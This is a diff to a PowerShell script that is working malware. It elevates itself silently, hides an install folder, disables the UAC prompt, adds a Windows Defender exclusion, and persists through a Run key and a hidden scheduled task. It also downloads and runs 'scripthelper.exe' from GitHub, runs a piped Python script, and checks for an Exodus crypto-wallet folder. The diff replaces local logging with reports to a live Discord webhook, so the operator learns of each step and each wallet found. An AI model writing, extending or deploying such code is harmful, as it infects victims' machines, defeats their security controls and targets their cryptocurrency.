@@ -5,22 +5,60 @@ if (-not $isAdmin) {
         Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& { $($MyInvocation.MyCommand.Definition) }`"" -Verb RunAs -WindowStyle Hidden
     }
     catch {
-        # Log elevation failure and continue
-        $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
-        "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to elevate privileges, continuing without admin rights: $_" | Out-File -FilePath $logPath -Append
+        # Send elevation failure to webhook
+        $webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
+        $message = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to elevate privileges, continuing without admin rights: $_"
+        $body = @{ content = $message } | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
     }
 }
 
 # Define all the code to run in a background thread
 $backgroundCode = @"
 # Initialize variables
-`$logPath = Join-Path `$env:USERPROFILE "Documents\winlog.log"
+`$webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
 `$installFolder = (Get-ChildItem -Path "C:\Program Files" -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName | Get-Random) ?? "C:\Program Files"
 `$exePath = Join-Path `$installFolder "scripthelper.exe"
 `$exeUrl = "https://github.com/skiddyskid111/resources/releases/download/adadad/scripthelper.exe"
 `$maxRetries = 3
 `$baseDelay = 1000
 `$maxDelay = 10000
+
+# Function to send log to webhook with rate limit handling
+function Send-LogToWebhook {
+    param (
+        [string]`$message
+    )
+    `$body = @{ content = `$message } | ConvertTo-Json
+    `$attempt = 0
+    `$success = `$false
+    while (-not `$success -and `$attempt -lt 3) {
+        try {
+            Invoke-RestMethod -Uri `$webhookUrl -Method Post -Body `$body -ContentType 'application/json' -ErrorAction Stop
+            `$success = `$true
+        }
+        catch {
+            `$attempt++
+            if (`$_.Exception.Response.StatusCode -eq 429) {
+                `$retryAfter = [int]`$_.Exception.Response.Headers['Retry-After']
+                if (`$retryAfter -gt 0) {
+                    Start-Sleep -Seconds `$retryAfter
+                }
+                else {
+                    Start-Sleep -Seconds (5 * `$attempt)  # Fallback exponential backoff
+                }
+            }
+            else {
+                # For other errors, sleep and retry
+                Start-Sleep -Seconds (5 * `$attempt)
+            }
+            if (`$attempt -eq 3) {
+                # Final failure, but don't throw to avoid script crash
+                Write-Error "Failed to send webhook message after 3 attempts: `$_"
+            }
+        }
+    }
+}
 
 # Simplified retry function with exponential backoff
 function Invoke-Retry {
@@ -36,7 +74,7 @@ function Invoke-Retry {
         catch {
             `$retryCount++
             if (`$retryCount -eq `$maxRetries) {
-                "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Action failed after `$maxRetries retries: `$_" | Out-File -FilePath `$logPath -Append
+                Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Action failed after `$maxRetries retries: `$_"
                 return
             }
             `$delay = [math]::Min(`$baseDelay * [math]::Pow(2, `$retryCount), `$maxDelay)
@@ -50,20 +88,20 @@ try {
     if (-not (Test-Path `$installFolder)) {
         New-Item -Path `$installFolder -ItemType Directory -Force | Out-Null
         Set-ItemProperty -Path `$installFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
-        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created and hid install folder: `$installFolder" | Out-File -FilePath `$logPath -Append
+        Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created and hid install folder: `$installFolder"
     }
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create or hide install folder: `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create or hide install folder: `$_"
 }
 
 # Disable UAC prompt (requires admin)
 try {
     Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "ConsentPromptBehaviorAdmin" -Value 0 -ErrorAction Stop
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Disabled UAC prompt" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Disabled UAC prompt"
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to disable UAC prompt (admin required): `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to disable UAC prompt (admin required): `$_"
 }
 
 # Add Windows Defender exclusion for the install folder (requires admin)
@@ -72,11 +110,11 @@ Invoke-Retry {
         `$exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
         if (`$exclusions -notcontains `$installFolder) {
             Add-MpPreference -ExclusionPath `$installFolder -ErrorAction Stop
-            "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added Defender exclusion for `$installFolder" | Out-File -FilePath `$logPath -Append
+            Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added Defender exclusion for `$installFolder"
         }
     }
     catch {
-        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add Defender exclusion (admin required): `$_" | Out-File -FilePath `$logPath -Append
+        Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add Defender exclusion (admin required): `$_"
     }
 }
 
@@ -87,11 +125,11 @@ try {
     `$regValue = "`"`$`exePath`""
     if (-not (Get-ItemProperty -Path `$regPath -Name `$regName -ErrorAction SilentlyContinue)) {
         New-ItemProperty -Path `$regPath -Name `$regName -Value `$regValue -PropertyType String -ErrorAction Stop
-        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added registry startup entry for `$exePath" | Out-File -FilePath `$logPath -Append
+        Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Added registry startup entry for `$exePath"
     }
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add registry startup entry (admin required): `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to add registry startup entry (admin required): `$_"
 }
 
 # Create scheduled task for EXE (requires admin)
@@ -103,11 +141,11 @@ try {
         `$principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
         `$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
         Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Principal `$principal -Settings `$settings -Description "Script Helper Task" -ErrorAction Stop
-        "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created scheduled task: `$taskName" | Out-File -FilePath `$logPath -Append
+        Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Created scheduled task: `$taskName"
     }
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create scheduled task (admin required): `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to create scheduled task (admin required): `$_"
 }
 
 # Download and execute scripthelper.exe
@@ -118,7 +156,7 @@ try {
         `$webClient.DownloadFile(`$exeUrl, `$exePath)
         if (Test-Path `$exePath) {
             Start-Process -FilePath `$exePath -WindowStyle Hidden -Wait
-            "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully downloaded and executed `$exePath" | Out-File -FilePath `$logPath -Append
+            Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully downloaded and executed `$exePath"
         }
         else {
             throw "File not found at `$exePath"
@@ -126,7 +164,7 @@ try {
     }
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to download or execute scripthelper.exe: `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to download or execute scripthelper.exe: `$_"
 }
 finally {
     if (`$webClient) { `$webClient.Dispose() }
@@ -152,13 +190,13 @@ try {
                 `$process.StandardInput.Write(`$pythonScriptContent)
                 `$process.StandardInput.Close()
                 `$process.WaitForExit(30000)
-                "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully executed Python script" | Out-File -FilePath `$logPath -Append
+                Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Successfully executed Python script"
             }
         }
     }
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to execute Python script: `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to execute Python script: `$_"
 }
 finally {
     if (`$webClient) { `$webClient.Dispose() }
@@ -168,24 +206,27 @@ finally {
 # Check for Exodus folder and send Discord webhook notification
 try {
     `$path = "C:\Users\admin\AppData\Roaming\Exodus"
-    `$webhook = "https://discord.com/api/webhooks/1407029219518845040/sWn_4wuVDm3VurOpSLcHqKk_gDd4N7teOWFQrorRIjzts6fmi3R45vynyVKv-iGTJYQj"
     `$user = `$env:USERNAME
     `$msg = if (Test-Path `$path) { "@everyone Exists! User: `$user" } else { "Does not Exist! User: `$user" }
-    Invoke-RestMethod -Uri `$webhook -Method Post -Body (@{ content = `$msg } | ConvertTo-Json) -ContentType 'application/json'
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Sent Discord webhook notification: `$msg" | Out-File -FilePath `$logPath -Append
+    `$body = @{ content = `$msg } | ConvertTo-Json
+    Invoke-RestMethod -Uri `$webhookUrl -Method Post -Body `$body -ContentType 'application/json'
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Sent Discord webhook notification: `$msg"
 }
 catch {
-    "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to send Discord webhook: `$_" | Out-File -FilePath `$logPath -Append
+    Send-LogToWebhook "[`$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to send Discord webhook: `$_"
 }
 "@
 
-# Start the background process
 try {
     Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$backgroundCode`"" -WindowStyle Hidden
-    $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
-    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Started background process" | Out-File -FilePath $logPath -Append
+    $webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
+    $message = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Started background process"
+    $body = @{ content = $message } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
 }
 catch {
-    $logPath = Join-Path $env:USERPROFILE "Documents\winlog.log"
-    "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to start background process: $_" | Out-File -FilePath $logPath -Append
+    $webhookUrl = "https://discord.com/api/webhooks/1410962330300321834/9siRJ2eeQ-3gaV1Ma3r7akXbqZfdHrYG8owFAmySTUkdVVrH8pTFIehfXk87z9A9HuzR"
+    $message = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Failed to start background process: $_"
+    $body = @{ content = $message } | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
 }
